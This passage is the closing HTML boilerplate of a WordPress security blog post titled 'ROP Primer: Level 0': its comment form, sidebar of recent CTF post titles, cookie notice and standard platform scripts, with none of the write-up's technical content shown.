+				<span class="cat-links"><span class="screen-reader-text">Categories </span><a href="https://xmgv.wordpress.com/category/ctf/" rel="category tag">CTF</a>, <a href="https://xmgv.wordpress.com/tag/vulnhub/" rel="category tag">vulnhub</a></span><span class="tags-links"><span class="screen-reader-text">Tags</span><a href="https://xmgv.wordpress.com/tag/ctf/" rel="tag">CTF</a>, <a href="https://xmgv.wordpress.com/tag/vulnhub/" rel="tag">vulnhub</a></span><span class="comments-link"><a href="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/#respond">Leave a comment</a></span>			</footer><!-- .entry-footer -->
+</article><!-- #post-## -->
+
+<div id="comments" class="comments-area">
+
+	
+	
+		<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2015/08/15/rop-primer-level-0/#respond" style="display:none;">Cancel reply</a></small></h3>			<form action="https://xmgv.wordpress.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate>
+				<input type="hidden" id="highlander_comment_nonce" name="highlander_comment_nonce" value="816a8c4a8b" /><input type="hidden" name="_wp_http_referer" value="/2015/08/15/rop-primer-level-0/" />
+<input type="hidden" name="hc_post_as" id="hc_post_as" value="guest" />
+
+<div class="comment-form-field comment-textarea">
+	<label for="comment">Enter your comment here...</label>
+	<div id="comment-form-comment"><textarea id="comment" name="comment" title="Enter your comment here..."></textarea></div>
+</div>
+
+<div id="comment-form-identity">
+	<div id="comment-form-nascar">
+		<p>Fill in your details below or click an icon to log in:</p>
+		<ul>
+			<li class="selected" style="display:none;">
+				<a href="#comment-form-guest" id="postas-guest" class="nascar-signin-link"
+                   title="Login via Guest">
+									</a>
+			</li>
+			<li>
+				<a href="#comment-form-load-service:WordPress.com" id="postas-wordpress" class="nascar-signin-link"
+                   title="Login via WordPress.com">
+					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24" ><rect x="0" fill="none" width="24" height="24"/><g><path fill="#FFF" d="M12.158 12.786l-2.698 7.84c.806.236 1.657.365 2.54.365 1.047 0 2.05-.18 2.986-.51-.024-.037-.046-.078-.065-.123l-2.762-7.57zM3.008 12c0 3.56 2.07 6.634 5.068 8.092L3.788 8.342c-.5 1.117-.78 2.354-.78 3.658zm15.06-.454c0-1.112-.398-1.88-.74-2.48-.456-.74-.883-1.368-.883-2.11 0-.825.627-1.595 1.51-1.595.04 0 .078.006.116.008-1.598-1.464-3.73-2.36-6.07-2.36-3.14 0-5.904 1.613-7.512 4.053.21.008.41.012.58.012.94 0 2.395-.114 2.395-.114.484-.028.54.684.057.74 0 0-.487.058-1.03.086l3.275 9.74 1.968-5.902-1.4-3.838c-.485-.028-.944-.085-.944-.085-.486-.03-.43-.77.056-.742 0 0 1.484.114 2.368.114.94 0 2.397-.114 2.397-.114.486-.028.543.684.058.74 0 0-.488.058-1.03.086l3.25 9.665.897-2.997c.456-1.17.684-2.137.684-2.907zm1.82-3.86c.04.286.06.593.06.924 0 .912-.17 1.938-.683 3.22l-2.746 7.94c2.672-1.558 4.47-4.454 4.47-7.77 0-1.564-.4-3.033-1.1-4.314zM12 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"/></g></svg>				</a>
+			</li>
+			<li>
+			<iframe id="googleplus-sign-in" name="googleplus-sign-in" src="https://public-api.wordpress.com/connect/?googleplus-sign-in=https%3A%2F%2Fxmgv.wordpress.com&#038;color_scheme=dark" width="24" height="24" scrolling="no" allowtransparency="true" seamless="seamless" frameborder="0"></iframe>
+			</li>
+			<li>
+				<a href="#comment-form-load-service:Twitter" id="postas-twitter" class="nascar-signin-link"
+                   title="Login via Twitter">
+					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24" ><rect x="0" fill="none" width="24" height="24"/><g><path fill="#FFF" d="M22.23 5.924c-.736.326-1.527.547-2.357.646.847-.508 1.498-1.312 1.804-2.27-.793.47-1.67.812-2.606.996C18.325 4.498 17.258 4 16.078 4c-2.266 0-4.103 1.837-4.103 4.103 0 .322.036.635.106.935-3.41-.17-6.433-1.804-8.457-4.287-.353.607-.556 1.312-.556 2.064 0 1.424.724 2.68 1.825 3.415-.673-.022-1.305-.207-1.86-.514v.052c0 1.988 1.415 3.647 3.293 4.023-.344.095-.707.145-1.08.145-.265 0-.522-.026-.773-.074.522 1.63 2.038 2.817 3.833 2.85-1.404 1.1-3.174 1.757-5.096 1.757-.332 0-.66-.02-.98-.057 1.816 1.164 3.973 1.843 6.29 1.843 7.547 0 11.675-6.252 11.675-11.675 0-.178-.004-.355-.012-.53.802-.578 1.497-1.3 2.047-2.124z"/></g></svg>				</a>
+			</li>
+			<li>
+				<a href="#comment-form-load-service:Facebook" id="postas-facebook" class="nascar-signin-link"
+                   title="Login via Facebook">
+					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24" ><rect x="0" fill="none" width="24" height="24"/><g><path fill="#FFF" d="M20.007 3H3.993C3.445 3 3 3.445 3 3.993v16.013c0 .55.445.994.993.994h8.62v-6.97H10.27V11.31h2.346V9.31c0-2.325 1.42-3.59 3.494-3.59.993 0 1.847.073 2.096.106v2.43h-1.438c-1.128 0-1.346.537-1.346 1.324v1.734h2.69l-.35 2.717h-2.34V21h4.587c.548 0 .993-.445.993-.993V3.993c0-.548-.445-.993-.993-.993z"/></g></svg>				</a>
+			</li>
+		</ul>
+	</div>
+
+	<div id="comment-form-guest" class="comment-form-service selected">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+<a href="https://gravatar.com/site/signup/" target="_blank">				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="Gravatar" width="25" class="no-grav" />
+</a>			</div>
+
+				<div class="comment-form-fields">
+				<div class="comment-form-field comment-form-email">
+					<label for="email">Email <span class="required">(required)</span> <span class="nopublish">(Address never made public)</span></label>
+					<div class="comment-form-input"><input id="email" name="email" type="email" value="" /></div>
+				</div>
+				<div class="comment-form-field comment-form-author">
+					<label for="author">Name <span class="required">(required)</span></label>
+					<div class="comment-form-input"><input id="author" name="author" type="text" value="" /></div>
+				</div>
+				<div class="comment-form-field comment-form-url">
+					<label for="url">Website</label>
+					<div class="comment-form-input"><input id="url" name="url" type="url" value="" /></div>
+				</div>
+			</div>
+			
+		</div>
+	</div>
+
+	<div id="comment-form-wordpress" class="comment-form-service">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="WordPress.com Logo" width="25" class="no-grav" />
+			</div>
+
+				<div class="comment-form-fields">
+				<input type="hidden" name="wp_avatar" id="wordpress-avatar" class="comment-meta-wordpress" value="" />
+				<input type="hidden" name="wp_user_id" id="wordpress-user_id" class="comment-meta-wordpress" value="" />
+				<input type="hidden" name="wp_access_token" id="wordpress-access_token" class="comment-meta-wordpress" value="" />
+						<p class="comment-form-posting-as pa-wordpress">
+			<strong></strong>
+			You are commenting using your WordPress.com account.			<span class="comment-form-log-out">
+				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'wordpress' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
+				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
+			</span>
+			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24" ><rect x="0" fill="none" width="24" height="24"/><g><path fill="#FFF" d="M12.158 12.786l-2.698 7.84c.806.236 1.657.365 2.54.365 1.047 0 2.05-.18 2.986-.51-.024-.037-.046-.078-.065-.123l-2.762-7.57zM3.008 12c0 3.56 2.07 6.634 5.068 8.092L3.788 8.342c-.5 1.117-.78 2.354-.78 3.658zm15.06-.454c0-1.112-.398-1.88-.74-2.48-.456-.74-.883-1.368-.883-2.11 0-.825.627-1.595 1.51-1.595.04 0 .078.006.116.008-1.598-1.464-3.73-2.36-6.07-2.36-3.14 0-5.904 1.613-7.512 4.053.21.008.41.012.58.012.94 0 2.395-.114 2.395-.114.484-.028.54.684.057.74 0 0-.487.058-1.03.086l3.275 9.74 1.968-5.902-1.4-3.838c-.485-.028-.944-.085-.944-.085-.486-.03-.43-.77.056-.742 0 0 1.484.114 2.368.114.94 0 2.397-.114 2.397-.114.486-.028.543.684.058.74 0 0-.488.058-1.03.086l3.25 9.665.897-2.997c.456-1.17.684-2.137.684-2.907zm1.82-3.86c.04.286.06.593.06.924 0 .912-.17 1.938-.683 3.22l-2.746 7.94c2.672-1.558 4.47-4.454 4.47-7.77 0-1.564-.4-3.033-1.1-4.314zM12 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"/></g></svg></span>
+		</p>
+					</div>
+	
+		</div>
+	</div>
+
+	<div id="comment-form-googleplus" class="comment-form-service">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="Google+ photo" width="25" class="no-grav" />
+			</div>
+
+				<div class="comment-form-fields">
+				<input type="hidden" name="googleplus_avatar" id="googleplus-avatar" class="comment-meta-googleplus" value="" />
+				<input type="hidden" name="googleplus_user_id" id="googleplus-user_id" class="comment-meta-googleplus" value="" />
+				<input type="hidden" name="googleplus_access_token" id="googleplus-access_token" class="comment-meta-googleplus" value="" />
+						<p class="comment-form-posting-as pa-googleplus">
+			<strong></strong>
+			You are commenting using your Google+ account.			<span class="comment-form-log-out">
+				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'googleplus' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
+				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
+			</span>
+			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" x="0px" y="0px" viewBox="0 0 60 60" ><path fill="#FFF" d="M56.3,30c0,-1.6 -0.2,-3.4 -0.6,-5h-3.1H42.2H30v10.6h14.8C44,39.3 42,42 39.1,43.9l8.8,6.8C53,46 56.3,39 56.3,30z" /><path fill="#FFF" d="M30,57.5c6.7,0 13.1,-2.4 17.9,-6.8l-8.8,-6.8c-2.5,1.6 -5.6,2.4 -9.1,2.4c-7.2,0 -13.3,-4.7 -15.4,-11.2l-9.3,7.1C9.8,51.3 19.1,57.5 30,57.5z" /><path fill="#FFF" d="M5.3,42.2l9.3,-7.1c-0.5,-1.6 -0.8,-3.3 -0.8,-5.1s0.3,-3.5 0.8,-5.1l-9.3,-7.1C3.5,21.5 2.5,25.6 2.5,30S3.5,38.5 5.3,42.2z" /><path fill="#FFF" d="M40.1,17.4l8,-8C43.3,5.1 37,2.5 30,2.5C19.1,2.5 9.8,8.7 5.3,17.8l9.3,7.1c2.1,-6.5 8.2,-11.1 15.4,-11.1C33.9,13.7 37.4,15.1 40.1,17.4z" /></svg></span>
+		</p>
+					</div>
+	
+		</div>
+	</div>
+
+	<div id="comment-form-twitter" class="comment-form-service">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="Twitter picture" width="25" class="no-grav" />
+			</div>
+
+				<div class="comment-form-fields">
+				<input type="hidden" name="twitter_avatar" id="twitter-avatar" class="comment-meta-twitter" value="" />
+				<input type="hidden" name="twitter_user_id" id="twitter-user_id" class="comment-meta-twitter" value="" />
+				<input type="hidden" name="twitter_access_token" id="twitter-access_token" class="comment-meta-twitter" value="" />
+						<p class="comment-form-posting-as pa-twitter">
+			<strong></strong>
+			You are commenting using your Twitter account.			<span class="comment-form-log-out">
+				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'twitter' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
+				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
+			</span>
+			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24" ><rect x="0" fill="none" width="24" height="24"/><g><path fill="#FFF" d="M22.23 5.924c-.736.326-1.527.547-2.357.646.847-.508 1.498-1.312 1.804-2.27-.793.47-1.67.812-2.606.996C18.325 4.498 17.258 4 16.078 4c-2.266 0-4.103 1.837-4.103 4.103 0 .322.036.635.106.935-3.41-.17-6.433-1.804-8.457-4.287-.353.607-.556 1.312-.556 2.064 0 1.424.724 2.68 1.825 3.415-.673-.022-1.305-.207-1.86-.514v.052c0 1.988 1.415 3.647 3.293 4.023-.344.095-.707.145-1.08.145-.265 0-.522-.026-.773-.074.522 1.63 2.038 2.817 3.833 2.85-1.404 1.1-3.174 1.757-5.096 1.757-.332 0-.66-.02-.98-.057 1.816 1.164 3.973 1.843 6.29 1.843 7.547 0 11.675-6.252 11.675-11.675 0-.178-.004-.355-.012-.53.802-.578 1.497-1.3 2.047-2.124z"/></g></svg></span>
+		</p>
+					</div>
+	
+		</div>
+	</div>
+
+	<div id="comment-form-facebook" class="comment-form-service">
+		<div class="comment-form-padder">
+			<div class="comment-form-avatar">
+				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="Facebook photo" width="25" class="no-grav" />
+			</div>
+
+				<div class="comment-form-fields">
+				<input type="hidden" name="fb_avatar" id="facebook-avatar" class="comment-meta-facebook" value="" />
+				<input type="hidden" name="fb_user_id" id="facebook-user_id" class="comment-meta-facebook" value="" />
+				<input type="hidden" name="fb_access_token" id="facebook-access_token" class="comment-meta-facebook" value="" />
+						<p class="comment-form-posting-as pa-facebook">
+			<strong></strong>
+			You are commenting using your Facebook account.			<span class="comment-form-log-out">
+				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'facebook' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
+				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
+			</span>
+			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24" ><rect x="0" fill="none" width="24" height="24"/><g><path fill="#FFF" d="M20.007 3H3.993C3.445 3 3 3.445 3 3.993v16.013c0 .55.445.994.993.994h8.62v-6.97H10.27V11.31h2.346V9.31c0-2.325 1.42-3.59 3.494-3.59.993 0 1.847.073 2.096.106v2.43h-1.438c-1.128 0-1.346.537-1.346 1.324v1.734h2.69l-.35 2.717h-2.34V21h4.587c.548 0 .993-.445.993-.993V3.993c0-.548-.445-.993-.993-.993z"/></g></svg></span>
+		</p>
+					</div>
+	
+		</div>
+	</div>
+
+
+	<div id="comment-form-load-service" class="comment-form-service">
+		<div class="comment-form-posting-as-cancel"><a href="javascript:HighlanderComments.cancelExternalWindow();">Cancel</a></div>
+		<p>Connecting to %s</p>
+	</div>
+
+</div>
+
+<script type="text/javascript">
+var highlander_expando_javascript = function(){
+	var input = document.createElement( 'input' ),
+	    comment = jQuery( '#comment' );
+
+	if ( 'placeholder' in input ) {
+		comment.attr( 'placeholder', jQuery( '.comment-textarea label' ).remove().text() );
+	}
+
+	// Expando Mode: start small, then auto-resize on first click + text length
+	jQuery( '#comment-form-identity' ).hide();
+	jQuery( '#comment-form-subscribe' ).hide();
+	jQuery( '#commentform .form-submit' ).hide();
+
+	comment.css( { 'height':'10px' } ).one( 'focus', function() {
+		var timer = setInterval( HighlanderComments.resizeCallback, 10 )
+		jQuery( this ).animate( { 'height': HighlanderComments.initialHeight } ).delay( 100 ).queue( function(n) { clearInterval( timer ); HighlanderComments.resizeCallback(); n(); } );
+		jQuery( '#comment-form-identity' ).slideDown();
+		jQuery( '#comment-form-subscribe' ).slideDown();
+		jQuery( '#commentform .form-submit' ).slideDown();
+	});
+}
+jQuery(document).ready( highlander_expando_javascript );
+</script>
+
+<div id="comment-form-subscribe">
+	<p class="comment-subscription-form"><input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;"/> <label class="subscribe-label" id="subscribe-label" for="subscribe" style="display: inline;">Notify me of new comments via email.</label></p></div>
+
+
+
+
+<p class="form-submit"><input name="submit" type="submit" id="comment-submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='165' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="6d03b73520" /></p>
+<input type="hidden" name="genseq" value="1535688372" />
+<p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="102"/></p>			</form>
+			</div><!-- #respond -->
+	<div style="clear: both"></div>
+</div><!-- .comments-area -->
+
+	<nav class="navigation post-navigation" role="navigation">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://xmgv.wordpress.com/2015/05/11/asis-ctf-quals-2015-zrypt/" rel="prev"><span class="meta-nav" aria-hidden="true">Previous</span> <span class="screen-reader-text">Previous post:</span> <span class="post-title">ASIS CTF Quals 2015:&nbsp;Zrypt</span></a></div><div class="nav-next"><a href="https://xmgv.wordpress.com/2015/08/17/rop-primer-level-1/" rel="next"><span class="meta-nav" aria-hidden="true">Next</span> <span class="screen-reader-text">Next post:</span> <span class="post-title">ROP Primer: Level&nbsp;1</span></a></div></div>
+	</nav>
+		</main><!-- .site-main -->
+	</div><!-- .content-area -->
+
+			<div id="sidebar" class="sidebar">
+		<div id="sidebar-inner" class="sidebar-inner">
+
+		
+		
+					<div id="secondary" class="widget-area" role="complementary">
+				<aside id="search-7" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://xmgv.wordpress.com/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit screen-reader-text" value="Search" />
+			</form></aside>		<aside id="recent-posts-7" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
+											<li>
+					<a href="https://xmgv.wordpress.com/2015/08/17/rop-primer-level-2/">ROP Primer: Level&nbsp;2</a>
+									</li>
+											<li>
+					<a href="https://xmgv.wordpress.com/2015/08/17/rop-primer-level-1/">ROP Primer: Level&nbsp;1</a>
+									</li>
+											<li>
+					<a href="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/">ROP Primer: Level&nbsp;0</a>
+									</li>
+											<li>
+					<a href="https://xmgv.wordpress.com/2015/05/11/asis-ctf-quals-2015-zrypt/">ASIS CTF Quals 2015:&nbsp;Zrypt</a>
+									</li>
+											<li>
+					<a href="https://xmgv.wordpress.com/2015/05/11/asis-ctf-quals-2015-broken-heart/">ASIS CTF Quals 2015: Broken&nbsp;Heart</a>
+									</li>
+					</ul>
+		</aside><aside id="categories-7" class="widget widget_categories"><h2 class="widget-title">Categories</h2>		<ul>
+	<li class="cat-item cat-item-663591"><a href="https://xmgv.wordpress.com/category/ctf/" >CTF</a>
+</li>
+	<li class="cat-item cat-item-12169903"><a href="https://xmgv.wordpress.com/category/slae/" >SLAE</a>
+</li>
+	<li class="cat-item cat-item-248032408"><a href="https://xmgv.wordpress.com/category/vulnhub/" >vulnhub</a>
+</li>
+		</ul>
+</aside><aside id="archives-7" class="widget widget_archive"><h2 class="widget-title">Archives</h2>		<ul>
+			<li><a href='https://xmgv.wordpress.com/2015/08/'>August 2015</a></li>
+	<li><a href='https://xmgv.wordpress.com/2015/05/'>May 2015</a></li>
+	<li><a href='https://xmgv.wordpress.com/2015/03/'>March 2015</a></li>
+	<li><a href='https://xmgv.wordpress.com/2015/02/'>February 2015</a></li>
+		</ul>
+		</aside>			</div><!-- .widget-area -->
+		
+		</div>
+	</div><!-- .sidebar -->
+
+	</div><!-- .site-content -->
+
+	<footer id="colophon" class="site-footer" role="contentinfo">
+		<div class="site-info">
+			<a href="https://wordpress.com/?ref=footer_blog">Blog at WordPress.com.</a>
+			
+					</div><!-- .site-info -->
+	</footer><!-- .site-footer -->
+</div><!-- .site -->
+
+<!--  -->
+<script type='text/javascript' src='//0.gravatar.com/js/gprofiles.js?ver=201835y'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://s1.wp.com/wp-content/mu-plugins/gravatar-hovercards/wpgroho.js?m=1380573781h'></script>
+
+	<script>
+		//initialize and attach hovercards to all gravatars
+		jQuery( document ).ready( function( $ ) {
+
+			if (typeof Gravatar === "undefined"){
+				return;
+			}
+
+			if ( typeof Gravatar.init !== "function" ) {
+				return;
+			}			
+
+			Gravatar.profile_cb = function( hash, id ) {
+				WPGroHo.syncProfileData( hash, id );
+			};
+			Gravatar.my_hash = WPGroHo.my_hash;
+			Gravatar.init( 'body', '#wp-admin-bar-my-account' );
+		});
+	</script>
+
+		<div style="display:none">
+	</div>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var HighlanderComments = {"loggingInText":"Logging In\u2026","submittingText":"Posting Comment\u2026","postCommentText":"Post Comment","connectingToText":"Connecting to %s","commentingAsText":"%1$s: You are commenting using your %2$s account.","logoutText":"Log Out","loginText":"Log In","connectURL":"https:\/\/xmgv.wordpress.com\/public.api\/connect\/?action=request","logoutURL":"https:\/\/xmgv.wordpress.com\/wp-login.php?action=logout&_wpnonce=f0ead8aa7e","homeURL":"https:\/\/xmgv.wordpress.com\/","postID":"165","gravDefault":"identicon","enterACommentError":"Please enter a comment","enterEmailError":"Please enter your email address here","invalidEmailError":"Invalid email address","enterAuthorError":"Please enter your name here","gravatarFromEmail":"This picture will show whenever you leave a comment. Click to customize it.","logInToExternalAccount":"Log in to use details from one of these accounts.","change":"Change","changeAccount":"Change Account","comment_registration":"0","userIsLoggedIn":"","isJetpack":"","text_direction":"ltr"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://s2.wp.com/_static/??/wp-content/js/jquery/jquery.autoresize.js,/wp-content/mu-plugins/highlander-comments/script.js?m=1521806916j'></script>
+
+	<script type="text/javascript">
+		window.WPCOM_sharing_counts = {"https:\/\/xmgv.wordpress.com\/2015\/08\/15\/rop-primer-level-0\/":165};
+	</script>
+<div class="widget widget_eu_cookie_law_widget"><div
+	class="hide-on-button ads-active"
+	data-hide-timeout="30"
+	data-consent-expiration="180"
+	id="eu-cookie-law"
+>
+	<form method="post">
+		<input type="submit" value="Close and accept" class="accept" />
+
+		Privacy &amp; Cookies: This site uses cookies. By continuing to use this website, you agree to their use. <br />
+To find out more, including how to control cookies, see here:
+		<a href="https://automattic.com/cookies" >
+			Cookie Policy		</a>
+ </form>
+</div>
+</div><script type='text/javascript'>
+/* <![CDATA[ */
+var comment_like_text = {"loading":"Loading..."};
+/* ]]> */
+</script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var screenReaderText = {"expand":"<span class=\"screen-reader-text\">expand child menu<\/span>","collapse":"<span class=\"screen-reader-text\">collapse child menu<\/span>"};
+var toggleButtonText = {"menu":"Menu","widgets":"Widgets","both":"Menu & Widgets"};
+/* ]]> */
+</script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var actionbardata = {"siteID":"78522205","siteName":"oh-la-la","siteURL":"http:\/\/xmgv.wordpress.com","icon":"<img alt='' src='https:\/\/s2.wp.com\/i\/logo\/wpcom-gray-white.png' class='avatar avatar-50' height='50' width='50' \/>","canManageOptions":"","canCustomizeSite":"","isFollowing":"","themeSlug":"pub\/afterlight","signupURL":"https:\/\/wordpress.com\/start\/","loginURL":"https:\/\/xmgv.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fxmgv.wordpress.com%2F2015%2F08%2F15%2Frop-primer-level-0%2F","themeURL":"https:\/\/wordpress.com\/theme\/afterlight\/","xhrURL":"https:\/\/xmgv.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"a2710f2aa5","isSingular":"1","isFolded":"","isLoggedIn":"","isMobile":"","subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"26b1e29b87\" \/>","referer":"https:\/\/xmgv.wordpress.com\/2015\/08\/15\/rop-primer-level-0\/","canFollow":"1","feedID":"34278202","statusMessage":"","customizeLink":"https:\/\/xmgv.wordpress.com\/wp-admin\/customize.php?url=https%3A%2F%2Fxmgv.wordpress.com%2F2015%2F08%2F15%2Frop-primer-level-0%2F","postID":"165","shortlink":"https:\/\/wp.me\/p5jtdb-2F","canEditPost":"","editLink":"https:\/\/wordpress.com\/post\/xmgv.wordpress.com\/165","statsLink":"https:\/\/wordpress.com\/stats\/post\/165\/xmgv.wordpress.com","i18n":{"view":"View site","follow":"Follow","following":"Following","edit":"Edit","login":"Log in","signup":"Sign up","customize":"Customize","report":"Report this content","themeInfo":"Get theme: Afterlight","shortlink":"Copy shortlink","copied":"Copied","followedText":"New posts from this site will now appear in your <a href=\"https:\/\/wordpress.com\/\">Reader<\/a>","foldBar":"Collapse this bar","unfoldBar":"Expand this bar","editSubs":"Manage subscriptions","viewReader":"View site in Reader","viewReadPost":"View post in Reader","subscribe":"Sign me up","enterEmail":"Enter your email address","followers":"","alreadyUser":"Already have a WordPress.com account? <a href=\"https:\/\/xmgv.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fxmgv.wordpress.com%2F2015%2F08%2F15%2Frop-primer-level-0%2F\">Log in now.<\/a>","stats":"Stats"}};
+/* ]]> */
+</script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var sharing_js_options = {"lang":"en","counts":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://s2.wp.com/_static/??-eJyVkF1uwyAQhC9UvG2sKspD1aNUGC/2mt+yEKe3D05UK0klq3kCzc63zABzFCr4jD7DxNDjkRTGUzPxC9yMXBHRloE8gyWDDN8FC47S9xbThlkF56okrtC00B3wTBGfge6ERzCP6Kotlg6kzpgsDeOlCxuKFfFG6KAKC01rLfLKlv5+ecJofxpH/t8P6OJVpuD/RLrpMlM/YGbAUqfBEAorZ8joopUZH/SNPbKvyUQnEzjJNUS9iXDElGipsWpPbshJKrMVX14KLtB623IbYodZtM0rfNU/Bh2S2/DHwFloKykBjzKRH37PCn26j7f3dnfY79rDfjoDIKz+TQ=='></script>
+<script type='text/javascript'>
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-google-plus-1', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomgoogle-plus-1', 'menubar=1,resizable=1,width=480,height=550' );
+				return false;
+			});
+</script>
+<script type="text/javascript">
+// <![CDATA[
+(function() {
+try{
+  if ( window.external &&'msIsSiteMode' in window.external) {
+    if (window.external.msIsSiteMode()) {
+      var jl = document.createElement('script');
+      jl.type='text/javascript';
+      jl.async=true;
+      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
+      var s = document.getElementsByTagName('script')[0];
+      s.parentNode.insertBefore(jl, s);
+    }
+  }
+}catch(e){}
+})();
+// ]]>
+</script>	<script type="text/javascript">
+	var skimlinks_pub_id = "725X584219"
+	var skimlinks_sitename = "xmgv.wordpress.com";
+	</script>
+	<script type="text/javascript" defer src="https://s.skimresources.com/js/725X1342.skimlinks.js"></script>		<iframe src='https://widgets.wp.com/likes/master.html?ver=20180319#ver=20180319' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
+		<div id='likes-other-gravatars'><div class="likes-text"><span>%d</span> bloggers like this:</div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
+<script src="//stats.wp.com/w.js?56" type="text/javascript" async defer></script>
+<script type="text/javascript">
+_tkq = window._tkq || [];
+_stq = window._stq || [];
+_tkq.push(['storeContext', {'blog_id':'78522205','blog_tz':'-3','user_lang':'en','blog_lang':'en','user_id':'0'}]);
+_stq.push(['view', {'blog':'78522205','v':'wpcom','tz':'-3','user_id':'0','post':'165','subd':'xmgv'}]);
+_stq.push(['extra', {'crypt':'UE5XaGUuOTlwaD85flAmcm1mcmZsaDhkV11YdWFnNncxc1tjZG9XVXhRY2gzcWhIRkllQ2lhMTlbYi5DMzU5V08rLmkwMVFQQWlLaFZoUmYtLEd3W3B1T1g0X254azJ0MUJNbU9La0FaVixYcXVmSXFPTVoseS96TVdQTXlGeElWdkNzNWN6RlNGRThQVFh3Jnpbc0lQMFFrdmpSb0JZTi9jLmwxJSsyRUh6R3lLTWFjeE5ab3ldQ25ISFpDc1VOeF8xakFyXXk9JmlQcmVnL3Q4N3dzPS9rT2tRPVVoeFlITU9fcX5uZmQ/YjQyenFIdj8sai5fQkNxTmdWWmg0d282ZTk9NENyRmNOQQ=='}]);
+_stq.push([ 'clickTrackerInit', '78522205', '165' ]);
+	</script>
